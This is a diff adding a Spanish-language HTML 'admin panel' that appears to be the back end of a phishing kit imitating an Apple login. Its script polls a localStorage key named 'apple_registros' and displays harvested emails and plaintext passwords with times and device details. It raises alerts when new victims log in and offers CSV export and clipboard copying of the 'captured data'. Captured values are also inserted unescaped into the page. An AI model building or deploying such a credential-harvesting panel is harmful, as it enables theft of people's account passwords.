@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel Admin - Datos en Vivo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: #f5f5f7;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .stats {
+            background: rgba(255,255,255,0.2);
+            padding: 12px 20px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .refresh-btn {
+            background: white;
+            color: #667eea;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .refresh-btn:hover {
+            transform: scale(1.05);
+        }
+        
+        .tabla-container {
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th {
+            background: #4a5568;
+            color: white;
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+        }
+        
+        td {
+            padding: 12px 15px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        
+        tr:hover {
+            background: #f7fafc;
+        }
+        
+        .email-cell {
+            font-weight: 500;
+            color: #2d3748;
+        }
+        
+        .password-cell {
+            font-family: monospace;
+            background: #fed7d7;
+            color: #c53030;
+            padding: 5px 10px;
+            border-radius: 5px;
+            display: inline-block;
+        }
+        
+        .time-cell {
+            color: #718096;
+            font-size: 14px;
+        }
+        
+        .actions {
+            margin-top: 20px;
+            display: flex;
+            gap: 10px;
+            justify-content: flex-end;
+        }
+        
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 14px;
+        }
+        
+        .btn-primary {
+            background: #0071e3;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #0077ed;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,113,227,0.3);
+        }
+        
+        .btn-danger {
+            background: #dc3545;
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background: #c82333;
+        }
+        
+        .btn-success {
+            background: #28a745;
+            color: white;
+        }
+        
+        .btn-success:hover {
+            background: #218838;
+        }
+        
+        .empty-state {
+            text-align: center;
+            padding: 50px;
+            color: #a0aec0;
+            font-size: 16px;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #48bb78;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+            transform: translateX(400px);
+            transition: transform 0.3s ease;
+            z-index: 9999;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .contador-vivo {
+            background: #ed8936;
+            color: white;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>
+                📊 PANEL DE CONTROL - DATOS EN VIVO
+                <span class="contador-vivo" id="contadorVivo">0</span>
+            </h1>
+            <div>
+                <span class="stats" id="stats">Actualizando...</span>
+                <button class="refresh-btn" onclick="cargarDatos()">🔄 Actualizar ahora</button>
+            </div>
+        </div>
+        
+        <div class="tabla-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>HORA</th>
+                        <th>EMAIL</th>
+                        <th>CONTRASEÑA</th>
+                        <th>FECHA</th>
+                        <th>DISP.</th>
+                    </tr>
+                </thead>
+                <tbody id="tablaBody">
+                    <tr>
+                        <td colspan="6" class="empty-state">
+                            <div style="font-size: 20px; margin-bottom: 10px;">📭 No hay datos aún</div>
+                            <div style="color: #a0aec0;">Esperando que alguien inicie sesión...</div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        
+        <div class="actions">
+            <button class="btn btn-success" onclick="exportarCSV()">📥 EXPORTAR A EXCEL</button>
+            <button class="btn btn-primary" onclick="copiarAlPortapapeles()">📋 COPIAR TODO</button>
+            <button class="btn btn-danger" onclick="limpiarTodo()">🗑️ LIMPIAR TODO</button>
+        </div>
+        
+        <div style="margin-top: 20px; color: #718096; font-size: 12px; text-align: center;">
+            ⚡ Actualización automática cada 2 segundos | Total: <span id="totalRegistros">0</span> registros
+        </div>
+    </div>
+    
+    <div id="notification" class="notification"></div>
+    
+    <script>
+        // ============================================
+        // VARIABLES GLOBALES
+        // ============================================
+        let datos = [];
+        let intervaloActualizacion;
+        
+        // ============================================
+        // INICIALIZACIÓN
+        // ============================================
+        document.addEventListener('DOMContentLoaded', function() {
+            cargarDatos();
+            
+            // Actualizar cada 2 segundos
+            intervaloActualizacion = setInterval(cargarDatos, 2000);
+            
+            // Si hay datos nuevos, notificar
+            setInterval(verificarDatosNuevos, 3000);
+        });
+        
+        // ============================================
+        // CARGAR DATOS DESDE LOCALSTORAGE
+        // ============================================
+        function cargarDatos() {
+            try {
+                const datosGuardados = localStorage.getItem('apple_registros');
+                
+                if (datosGuardados) {
+                    const nuevosDatos = JSON.parse(datosGuardados);
+                    
+                    // Verificar si hay datos nuevos
+                    if (nuevosDatos.length > datos.length) {
+                        mostrarNotificacion(`📨 ${nuevosDatos.length - datos.length} nuevo(s) registro(s)`);
+                    }
+                    
+                    datos = nuevosDatos;
+                } else {
+                    datos = [];
+                }
+                
+                actualizarTabla();
+                actualizarEstadisticas();
+                
+            } catch (error) {
+                console.error('Error cargando datos:', error);
+            }
+        }
+        
+        // ============================================
+        // ACTUALIZAR TABLA
+        // ============================================
+        function actualizarTabla() {
+            const tbody = document.getElementById('tablaBody');
+            const contador = document.getElementById('contadorVivo');
+            const totalSpan = document.getElementById('totalRegistros');
+            
+            if (!tbody) return;
+            
+            if (datos.length === 0) {
+                tbody.innerHTML = `
+                    <tr>
+                        <td colspan="6" class="empty-state">
+                            <div style="font-size: 20px; margin-bottom: 10px;">📭 No hay datos aún</div>
+                            <div style="color: #a0aec0;">Esperando que alguien inicie sesión...</div>
+                        </td>
+                    </tr>
+                `;
+                if (contador) contador.textContent = '0';
+                if (totalSpan) totalSpan.textContent = '0';
+                return;
+            }
+            
+            // Actualizar contador
+            if (contador) contador.textContent = datos.length;
+            if (totalSpan) totalSpan.textContent = datos.length;
+            
+            // Construir tabla (mostrar últimos 20, del más nuevo al más viejo)
+            let html = '';
+            const datosRecientes = datos.slice().reverse().slice(0, 20);
+            
+            datosRecientes.forEach((item, index) => {
+                const hora = item.hora || (item.fecha ? item.fecha.split(' ')[1] : 'N/A');
+                const fecha = item.fecha || 'N/A';
+                const dispositivo = item.plataforma || (item.userAgent ? item.userAgent.substring(0, 20) + '...' : 'Desconocido');
+                
+                html += `
+                    <tr>
+                        <td style="font-weight: bold; color: #4a5568;">${datos.length - index}</td>
+                        <td class="time-cell">${hora}</td>
+                        <td class="email-cell">${item.email || 'Sin email'}</td>
+                        <td><span class="password-cell">${item.password || 'Sin contraseña'}</span></td>
+                        <td class="time-cell">${fecha}</td>
+                        <td class="time-cell">${dispositivo}</td>
+                    </tr>
+                `;
+            });
+            
+            // Si hay más de 20 registros, mostrar mensaje
+            if (datos.length > 20) {
+                html += `
+                    <tr style="background: #edf2f7;">
+                        <td colspan="6" style="padding: 10px; text-align: center; color: #4a5568; font-weight: bold;">
+                            ... y ${datos.length - 20} registros más (Total: ${datos.length})
+                        </td>
+                    </tr>
+                `;
+            }
+            
+            tbody.innerHTML = html;
+        }
+        
+        // ============================================
+        // ACTUALIZAR ESTADÍSTICAS
+        // ============================================
+        function actualizarEstadisticas() {
+            const stats = document.getElementById('stats');
+            
+            if (datos.length === 0) {
+                stats.textContent = '📊 Sin datos';
+                return;
+            }
+            
+            const ultimo = datos[datos.length - 1];
+            const horaUltimo = ultimo.hora || 'desconocida';
+            
+            stats.textContent = `📨 Último: ${horaUltimo} | Total: ${datos.length}`;
+        }
+        
+        // ============================================
+        // VERIFICAR DATOS NUEVOS
+        // ============================================
+        let datosAnteriores = 0;
+        
+        function verificarDatosNuevos() {
+            if (datos.length > datosAnteriores && datosAnteriores > 0) {
+                const nuevos = datos.length - datosAnteriores;
+                mostrarNotificacion(`🎯 ${nuevos} NUEVO(S) REGISTRO(S)`);
+                
+                // Reproducir sonido (opcional)
+                try {
+                    const audio = new Audio('data:audio/wav;base64,//uQRAAAAWMSLwUIYAAsYkXgoQwAEaYLWfkWgAI0wWs/ItAAAGDgYtAgAyN+QWaAAihwMWm4GmmQQFHzMcEhQAAAAwkN+QQA==');
+                    audio.play();
+                } catch(e) {}
+            }
+            datosAnteriores = datos.length;
+        }
+        
+        // ============================================
+        // MOSTRAR NOTIFICACIÓN
+        // ============================================
+        function mostrarNotificacion(mensaje) {
+            const notif = document.getElementById('notification');
+            notif.textContent = mensaje;
+            notif.classList.add('show');
+            
+            setTimeout(() => {
+                notif.classList.remove('show');
+            }, 3000);
+        }
+        
+        // ============================================
+        // EXPORTAR A CSV
+        // ============================================
+        function exportarCSV() {
+            if (datos.length === 0) {
+                alert('No hay datos para exportar');
+                return;
+            }
+            
+            let csv = 'Email,Contraseña,Fecha,Hora,Navegador\n';
+            datos.forEach(item => {
+                csv += `"${item.email || ''}","${item.password || ''}","${item.fecha || ''}","${item.hora || ''}","${item.userAgent || ''}"\n`;
+            });
+            
+            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+            const link = document.createElement('a');
+            const url = URL.createObjectURL(blob);
+            
+            link.href = url;
+            link.download = `datos_clase_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.csv`;
+            link.click();
+            
+            URL.revokeObjectURL(url);
+            mostrarNotificacion('✅ CSV exportado');
+        }
+        
+        // ============================================
+        // COPIAR AL PORTAPAPELES
+        // ============================================
+        function copiarAlPortapapeles() {
+            if (datos.length === 0) {
+                alert('No hay datos para copiar');
+                return;
+            }
+            
+            let texto = 'DATOS CAPTURADOS:\n\n';
+            datos.slice().reverse().forEach((item, i) => {
+                texto += `${i+1}. ${item.email} | ${item.password} | ${item.fecha}\n`;
+            });
+            
+            navigator.clipboard.writeText(texto).then(() => {
+                mostrarNotificacion('✅ Datos copiados al portapapeles');
+            }).catch(() => {
+                alert('No se pudo copiar');
+            });
+        }
+        
+        // ============================================
+        // LIMPIAR TODO
+        // ============================================
+        function limpiarTodo() {
+            if (confirm('¿Estás seguro de eliminar TODOS los registros?')) {
+                localStorage.removeItem('apple_registros');
+                datos = [];
+                datosAnteriores = 0;
+                cargarDatos();
+                mostrarNotificacion('🗑️ Todos los datos eliminados');
+            }
+        }
+        
+        // ============================================
+        // EXPONER FUNCIONES GLOBALMENTE
+        // ============================================
+        window.cargarDatos = cargarDatos;
+        window.exportarCSV = exportarCSV;
+        window.copiarAlPortapapeles = copiarAlPortapapeles;
+        window.limpiarTodo = limpiarTodo;
+    </script>
+</body>
+</html>
